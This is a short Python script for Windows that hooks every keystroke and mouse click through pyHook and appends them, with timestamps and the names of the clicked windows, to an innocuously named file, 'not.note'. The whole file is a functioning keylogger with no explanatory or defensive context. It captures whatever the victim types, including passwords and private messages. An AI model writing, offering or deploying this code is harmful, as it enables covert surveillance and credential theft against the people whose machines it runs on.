# -*- coding: utf-8 -*-

import os
import pythoncom, pyHook
from datetime import datetime


try:
    with open('not.note', 'a') as f:
        f.write('\n{0:-<22}\n[ {1} ]\n{0:-<22}\n'.format('-', str(datetime.now()).split('.')[0]))
        f.close()

except Exception:
    pass


def wfile(data):
    f = open('not.note', 'a')
    f.write(data)
    f.close()


def key(event):
    data = str(event.Key)
    data = data.lower()

    if data == 'space':
        data = ' '
    elif data == 'return':
        data = '\n'
    elif data == 'lshift':
        data = ' LSHIFT '
    elif data == 'rshift':
        data = ' RSHIFT '
    elif data == 'tab':
        data = ' TAB '
    elif data == 'capital':
        data = ' CAPITAL '
    elif data == 'escape':
        data = ' ESCAPE '
    elif data == 'delete':
        data = ' DELETE '
    elif data == 'back':
        data = ' BACK '
    elif data == 'lcontrol':
        data = ' LCTRL '
    elif data == 'lmenu':
        data = ' LALT '
    elif data == 'oem_102':
        data = '\\ '
    elif data == 'oem_comma':
        data = ', '
    elif data == 'oem_period':
        data = '. '
    elif data == 'oem_2':
        data = '/ '
    elif data == 'oem_1':
        data = '; '
    elif data == 'oem_7':
        data = '\' '
    elif data == 'oem_5':
        data = '\\ '
    elif data == 'oem_4':
        data = '[ '
    elif data == 'oem_6':
        data = ' ] '
    elif data == 'oem_minus':
        data = ' - '
    elif data == 'oem_plus':
        data = ' = '
    elif data == 'oem_3':
        data = ' \` '

    wfile(data)
    data = ''
    return True


def mouse(event):
    data = event.MessageName
    t = str(datetime.now()).split('.')[0]
    if str(data) == 'mouse left down':
        data = '\n{0:-<22}\n{1}\nMouse Left - WindowName:\n{2}\n{0:-<22}\n'.format('-', t, str(event.WindowName))
    elif str(data) == 'mouse right down':
        data = '\n{0:-<22}\n{1}\nMouse Right - WindowName:\n{2}\n{0:-<22}\n'.format('-', t, str(event.WindowName))

    wfile(data)
    data = ''
    return True


hook = pyHook.HookManager()
hook.KeyDown = key
hook.MouseAllButtonsDown = mouse
hook.HookKeyboard()
hook.HookMouse()
pythoncom.PumpMessages()
